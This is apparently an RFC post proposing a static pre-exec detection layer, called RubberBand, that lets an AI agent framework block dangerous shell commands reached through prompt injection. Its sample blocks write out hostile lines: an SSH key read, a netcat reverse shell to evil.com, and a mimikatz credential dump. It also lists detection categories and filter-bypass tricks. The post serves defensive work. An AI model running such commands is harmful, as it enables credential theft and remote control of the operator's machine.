# RFC: Static Detection for Exec Commands (RubberBand)

## TL;DR

I built a lightweight static detection layer for the exec pipeline that catches dangerous commands (credential access, exfiltration, reverse shells) — as a defense against prompt injection reaching exec. Looking for feedback before submitting a PR.

**Fork with implementation:** [jeffaf/openclaw](https://github.com/jeffaf/openclaw) (branch: `feat/rubberband-integration`)

> 🦞 I've been calling this "RubberBand" — like the bands on lobster claws that keep them from pinching. The agent is the lobster, and this feature bands the dangerous parts so it can't pinch the operator. Felt appropriate for OpenClaw.

---

## The Problem

Prompt injection is a real risk for agents with exec access. Input-level detection helps, but injections that slip through must eventually **do something** — access credentials, exfiltrate data, establish persistence.

Current defenses focus on:
- **Allowlists** — "Is this command pattern permitted?" (existing in OpenClaw)
- **Input sanitization** — Wrap user messages, escape shell chars (#4542)
- **External frameworks** — Sentinel, prompt-guard (#3345, #4278)

These are valuable, but there's a gap: **What if injection bypasses input validation and reaches exec?**

## The Solution: RubberBand

A native pre-exec hook that analyzes commands for dangerous behaviors:

```
Agent exec(command)
       │
       ▼
┌──────────────────────────────┐
│  Existing allowlist check    │
└──────────────────────────────┘
       │
       ▼
┌──────────────────────────────┐
│  RubberBand pattern check    │  ← NEW
│  • Normalize (Unicode, URLs) │
│  • Pattern match             │
│  • Context-aware scoring     │
└──────────────────────────────┘
       │
       ├─ BLOCK → throw error
       ├─ ALERT → log warning
       └─ ALLOW → proceed
       │
       ▼
┌──────────────────────────────┐
│  runExecProcess()            │
└──────────────────────────────┘
```

### Detection Categories

| Category | Examples | Base Score |
|----------|----------|------------|
| credential_access | SSH keys, AWS creds, API tokens | 60-80 |
| data_exfiltration | curl POST to external hosts | 40-70 |
| reverse_shell | nc -e, bash /dev/tcp | 90 |
| config_tampering | Writes to SOUL.md, config files | 75 |
| memory_poisoning | Writes to memory/*.md | 55 |
| persistence | Crontab, LaunchAgents | 60 |
| indirect_execution | Pipe to shell, eval | 40 |

### Bypass Mitigations

- **Unicode normalization (NFKC)** — Catches Cyrillic lookalikes
- **URL decoding** — Catches %7e for ~
- **Shell escape expansion** — Catches $'\x7e'
- **Context-aware scoring** — Stripped content + execution pattern = higher risk

---

## Live Test Results

Tested against 134 bypass techniques (Unix + Windows):

| Category | Caught | Examples |
|----------|--------|----------|
| Credential access | 100% | SSH keys, AWS creds, SAM/SYSTEM, mimikatz |
| Reverse shells | 100% | nc, bash /dev/tcp, python/ruby/perl, PowerShell |
| Data exfiltration | 100% | curl POST, wget, certutil, bitsadmin |
| Persistence | 100% | crontab, schtasks, registry Run keys, LaunchAgents |
| Indirect execution | 100% | eval, pipe to shell, IEX, encoded commands |
| Container escape | 100% | docker -v /, kubectl exec |

**Overall: 98.5% detection, 0 false positives**

(The 1.5% "misses" are theoretical escapes like `\x69` that shells don't actually expand)

Sample blocks:
```
cat ~/.ssh/id_rsa           → BLOCKED (score 70, ssh_key_access)
nc -e /bin/bash evil.com    → BLOCKED (score 90, reverse_shell)
mimikatz sekurlsa::         → BLOCKED (score 95, win_credential_dump)
```

### Performance

**Detection overhead:** ~0.005ms per command

This measures the `analyzeCommand()` function (normalization + pattern matching), which is the added latency on top of existing exec. Tested over 1000 iterations on M1 Mac.

For context: a typical exec already takes 10-50ms for process spawning. The detection adds ~0.005ms — effectively invisible.

---

## How It Complements Existing Work

| Approach | What it does | This PR's difference |
|----------|--------------|----------------------|
| #4542 (Input isolation) | Sanitize input, escape shell | Catches behavior if injection bypasses sanitization |
| #4570 (Security Shield) | Rate limiting, firewall, IP blocking | Different layer (network vs exec pipeline) |
| Sentinel framework | External 4-layer validation | Native, zero-dependency, exec-focused |
| Allowlist | Pattern-based command approval | Analyzes command intent, not just syntax |

This is **defense-in-depth for prompt injection** — if an injection bypasses input detection and reaches exec, this layer catches the dangerous behavior before it runs.

---

## Implementation Details

**New file:** `src/security/rubberband.ts` (~500 lines)
- Pattern definitions with scoring
- Normalization pipeline
- Context-aware preprocessing
- Shadow mode for data gathering

**Modified:** `src/agents/bash-tools.exec.ts`
- Pre-exec hook after allowlist check
- ~20 lines of integration code

**Configuration:**
```yaml
tools:
  exec:
    rubberband:
      enabled: true
      mode: "shadow"  # shadow | alert | block
      thresholds:
        alert: 40
        block: 60
```

---

## Open Questions

1. **Opt-in or opt-out?** Should RubberBand be enabled by default?
2. **Default mode?** `shadow` (log only), `alert` (warn), or `block`?
3. **Config location?** Under `tools.exec.rubberband` or top-level `security`?
4. **Integration with ask mode?** Should ALERT disposition trigger user approval?
5. **Pattern extensibility?** Should users be able to add custom patterns via config?

---

## AI Disclosure

This was developed with Claude (Opus 4.5) running in OpenClaw. Testing level: fully tested (live validation on fork). The detection patterns have been hardened against 20+ bypass techniques including Unicode confusables, shell escape sequences, URL encoding, and alternative file readers. I understand the code and can answer questions about the implementation.

---

## Next Steps

Looking for feedback on:
- Is this approach sound?
- Any concerns about the hook location?
- Preferred defaults?
- Anything blocking a PR?

Happy to iterate based on feedback. Thanks! 🦞
